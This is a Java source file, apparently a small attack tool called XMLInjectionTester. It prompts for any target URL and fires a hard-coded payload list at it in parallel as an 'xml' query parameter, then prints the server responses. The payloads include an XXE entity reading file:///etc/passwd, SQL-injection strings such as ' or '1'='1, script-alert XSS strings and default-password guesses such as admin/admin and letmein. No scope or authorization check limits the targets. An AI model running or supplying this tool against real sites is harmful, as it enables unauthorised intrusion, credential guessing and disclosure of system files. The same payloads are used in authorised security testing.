import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class XMLInjectionTester {

    public static void main(String[] args) {
        String targetUrl = getUserInput("Enter your target website URL (including http/https): ");

        List<String> payloads = generatePayloads();

        testPayloads(targetUrl, payloads);
    }

    private static String getUserInput(String prompt) {
        System.out.print(prompt);
        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
        try {
            return reader.readLine().trim();
        } catch (Exception e) {
            e.printStackTrace();
            return "";
        }
    }

    private static List<String> generatePayloads() {
        List<String> payloads = new ArrayList<>();
        payloads.add("<username>admin</username><password>admin</password>");
        payloads.add("<username>' or '1'='1</username><password>' or '1'='1</password>");
        payloads.add("<!DOCTYPE test [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><username>&xxe;</username><password>admin</password>");
        payloads.add("<username><![CDATA[<script>alert('XSS')</script>]]></username><password>admin</password>");
        payloads.add("<username></username><!-- -->\n<password>admin</password>");
        payloads.add("<username>admin</username>&password=admin");
        // Add more payloads below
        payloads.add("<username>%3Cscript%3Ealert('XSS')%3C/script%3E</username><password>admin</password>");
        payloads.add("<username>admin</username><password>pass123</password>");
        payloads.add("<username>admin</username><password>password123</password>");
        payloads.add("<username>admin</username><password>letmein</password>");
        return payloads;
    }

    private static void testPayloads(String targetUrl, List<String> payloads) {
        ExecutorService executor = Executors.newFixedThreadPool(payloads.size());

        for (String payload : payloads) {
            executor.execute(() -> testPayload(targetUrl, payload));
        }

        executor.shutdown();
        try {
            executor.awaitTermination(10, TimeUnit.MINUTES);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private static void testPayload(String targetUrl, String payload) {
        try {
            String encodedPayload = URLEncoder.encode(payload, "UTF-8");
            String urlWithPayload = targetUrl + "?xml=" + encodedPayload;

            URL url = new URL(urlWithPayload);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setConnectTimeout(5000);
            connection.setReadTimeout(5000);
            connection.setRequestMethod("GET");

            int responseCode = connection.getResponseCode();

            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();

                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();

                System.out.println("\nPayload: \u001B[32m" + payload + "\u001B[0m");
                System.out.println("Response from the server:");
                System.out.println(response.toString());
            } else {
                System.out.println("\nPayload: \u001B[31m" + payload + "\u001B[0m");
                System.out.println("Request failed with response code: " + responseCode);
            }

            connection.disconnect();
        } catch (Exception e) {
            System.err.println("\nPayload: \u001B[31m" + payload + "\u001B[0m");
            e.printStackTrace();
        }
    }
}
